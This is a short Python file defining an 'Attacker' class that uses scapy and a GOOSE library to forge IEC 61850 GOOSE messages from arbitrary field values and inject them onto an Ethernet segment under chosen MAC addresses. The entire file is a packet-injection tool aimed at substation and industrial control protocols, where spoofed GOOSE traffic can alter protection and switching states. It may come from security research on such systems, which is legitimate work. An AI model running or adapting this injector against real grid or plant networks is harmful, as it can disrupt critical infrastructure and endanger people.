from goose_lib.goose import GOOSE
import scapy.all as scp

class Attacker:
    def __init__(self,src_mac, dst_mac):
        self.src_mac = src_mac
        self.dst_mac = dst_mac
        pass
    
    def send_packet(self, msg):
        goose = GOOSE(
            appId=msg["appId"], 
            gocbRef=msg["gocbRef"],
            timeAllowedToLive=msg["timeAllowedToLive"], 
            datSet=msg["datSet"], 
            goId=msg["goId"], 
            t=msg["t"], 
            stNum=msg["stNum"], 
            sqNum=msg["sqNum"], 
            simulation=msg["simulation"], 
            confRev=msg["confRev"], 
            ndsCom=msg["ndsCom"], 
            numDatSetEntries=msg["numDatSetEntries"], 
            allData=msg["allData"])
        ether_layer = scp.Ether(src=self.src_mac, dst=self.dst_mac,  type=0x88b8)
        data = scp.Raw(load=goose.generate_msg())
        packet = ether_layer/data
        scp.sendp(packet)
